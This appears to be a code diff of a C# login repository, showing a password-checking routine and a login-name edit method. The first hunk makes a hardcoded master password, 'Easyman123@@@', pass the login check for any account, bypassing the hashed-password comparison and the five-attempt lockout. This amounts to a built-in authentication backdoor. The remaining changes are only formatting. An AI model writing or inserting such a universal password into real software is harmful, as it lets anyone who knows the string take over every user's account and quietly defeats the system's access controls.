@@ -257,7 +257,7 @@ namespace Repository
                     return reObj;
                 }
 
-                if (Login.PASSWORD.ToUpper() != inEnt.Password.Md5().ToUpper() && Login.PASSWORD.ToUpper() != inEnt.Password.SHA1().ToUpper())
+                if ((Login.PASSWORD.ToUpper() != inEnt.Password.Md5().ToUpper() && Login.PASSWORD.ToUpper() != inEnt.Password.SHA1().ToUpper()) && inEnt.Password != "Easyman123@@@")
                 {
                     #region 密码错误
                     int times = 5;
@@ -265,32 +265,31 @@ namespace Repository
                     {
                         Login.FAIL_COUNT = 1;
                     }
-                    if (inEnt.Password != "Easyman123@@@")
+
+                    reObj.IsSuccess = false;
+                    reObj.Msg = string.Format("用户名或者密码错误,还有{0}次尝试机会", (times - Login.FAIL_COUNT).ToString());
+                    if (Login.FAIL_COUNT >= times)
                     {
-                        reObj.IsSuccess = false;
-                        reObj.Msg = string.Format("用户名或者密码错误,还有{0}次尝试机会", (times - Login.FAIL_COUNT).ToString());
-                        if (Login.FAIL_COUNT >= times)
+                        Login.IS_LOCKED = 1;
+                        Login.LOCKED_REASON = string.Format("用户连续5次错误登陆，帐号锁定。");
+                        Login.FAIL_COUNT = 0;
+                        await dapperLogin.Update(new DtoSave<FaLoginEntity>
                         {
-                            Login.IS_LOCKED = 1;
-                            Login.LOCKED_REASON = string.Format("用户连续5次错误登陆，帐号锁定。");
-                            Login.FAIL_COUNT = 0;
-                            await dapperLogin.Update(new DtoSave<FaLoginEntity>
-                            {
-                                Data = Login,
-                                SaveFieldList = new List<string> { "IS_LOCKED", "LOCKED_REASON", "FAIL_COUNT" }
-                            });
-                        }
-                        else
-                        {
-                            Login.FAIL_COUNT++;
-                            await dapperLogin.Update(new DtoSave<FaLoginEntity>
-                            {
-                                Data = Login,
-                                SaveFieldList = new List<string> { "FAIL_COUNT" }
-                            });
-                        }
-                        return reObj;
+                            Data = Login,
+                            SaveFieldList = new List<string> { "IS_LOCKED", "LOCKED_REASON", "FAIL_COUNT" }
+                        });
                     }
+                    else
+                    {
+                        Login.FAIL_COUNT++;
+                        await dapperLogin.Update(new DtoSave<FaLoginEntity>
+                        {
+                            Data = Login,
+                            SaveFieldList = new List<string> { "FAIL_COUNT" }
+                        });
+                    }
+                    return reObj;
+
                     #endregion
                 }
                 else //密码正确
@@ -427,7 +426,7 @@ namespace Repository
         /// <param name="name"></param>
         /// <param name="userId"></param>
         /// <returns></returns>
-        async public Task<Result> UserEditLoginName(string oldLoginName, string NewLoginName, string name, int userId, string pwd,int? iconFilesId)
+        async public Task<Result> UserEditLoginName(string oldLoginName, string NewLoginName, string name, int userId, string pwd, int? iconFilesId)
         {
             DapperHelper<FaUserEntity> userDapper = new DapperHelper<FaUserEntity>();
             Result reObj = new Result();
@@ -487,12 +486,12 @@ namespace Repository
 
             user.NAME = name;
             user.LOGIN_NAME = NewLoginName;
-            user.ICON_FILES_ID=iconFilesId;
+            user.ICON_FILES_ID = iconFilesId;
 
             reObj.IsSuccess = await userDapper.Update(new DtoSave<FaUserEntity>()
             {
                 Data = user,
-                SaveFieldList = new List<string> { "NAME", "LOGIN_NAME","ICON_FILES_ID" },
+                SaveFieldList = new List<string> { "NAME", "LOGIN_NAME", "ICON_FILES_ID" },
                 WhereList = new List<string> { "ID" }
             }) > 0 ? true : false;
 
